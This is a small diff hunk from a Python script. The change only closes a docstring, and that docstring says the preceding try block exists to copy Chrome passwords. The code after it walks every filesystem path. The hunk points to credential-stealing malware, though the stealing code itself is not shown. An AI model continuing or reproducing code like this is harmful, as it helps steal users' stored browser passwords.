@@ -25,7 +25,7 @@ def file():
         obj.mt()
     finally:
         pass
-    """ The above try ANd accept block is to copy chrome passwords. The chrome 
+    """ The above try ANd accept block is to copy chrome passwords. The chrome"""
     for pat in path:
         for root, dirs, files in os.walk(path):
             # Getting all the paths in the system
